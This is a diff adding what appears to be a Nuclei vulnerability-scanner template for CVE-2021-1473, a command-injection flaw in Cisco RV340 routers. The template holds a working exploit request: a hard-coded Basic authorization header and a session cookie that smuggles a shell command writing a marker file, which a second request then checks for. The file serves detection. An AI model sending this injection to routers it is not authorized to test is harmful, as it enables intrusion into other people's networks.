@@ -1,0 +1,76 @@
+id: cve-2021-1473
+info:
+  name: Cisco RV340 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Cisco RV34x series dual WAN gigabit VPN security routers are vulnerable to an authentication bypass and remote command execution vulnerability (CVE-2021-1473). This allows an attacker to execute arbitrary commands on the server.
+  classification:
+    cvss-score: 9.8
+    cve-id: CVE-2021-1473
+  tags: command-execution, rce
+
+variables:
+  rand1: "{{rand_text_alphanumeric(4)}}"
+  rand2: "{{rand_text_alphanumeric(4)}}"
+  randname: "{{rand_text_alphanumeric(4)}}"
+
+http:
+  - raw:
+      - |
+        POST /upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Authorization: Basic YWRtaW46MTIz
+        Cookie: sessionid='$(echo {{rand1}}{{rand2}} >/tmp/download/{{randname}}) #'
+        Content-Type: multipart/form-data; boundary=80923809238490238409238409
+
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="file.path"
+
+        /tmp/upload.input
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="input"
+
+        usa.img
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="filename"
+
+        input.img
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="fileparam"
+
+        usa
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="filename"; filename="input.img"
+
+        usa
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="option"
+
+        1
+        --80923809238490238409238409
+        Content-Disposition: form-data; name="destination"
+
+        1
+        --80923809238490238409238409--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /download/{{randname}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46MTIz
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand1}}{{rand2}}"
+        part: body
